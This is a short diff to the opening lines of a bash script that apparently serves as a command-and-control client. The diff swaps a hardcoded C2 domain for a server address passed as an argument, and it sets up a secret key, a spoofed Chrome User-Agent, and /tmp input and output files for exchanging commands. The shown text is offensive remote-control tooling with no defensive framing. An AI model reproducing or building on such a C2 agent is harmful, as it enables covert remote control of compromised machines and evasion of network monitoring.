@@ -1,14 +1,14 @@
 #!/bin/bash
 
-if [ -z "$1" ]; then
-  echo -e "Error\nExecute: $0 secretkey-provided-by-the-server\n"
-  exit 1
+if [[ $# < 2 ]];then
+    echo -e "Error\nExecute: $0 www.c2server.com secretkey-provided-by-the-server\n"
+    exit
 fi
 
 running=true
-secretkey="$1"
+secretkey="$2"
 user_agent="User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36"
-c2server="http://www.dedonocuegritaria.ml/?key=$secretkey"
+c2server="http://$1/?key=$secretkey"
 result=""
 input="/tmp/input"
 output="/tmp/output"
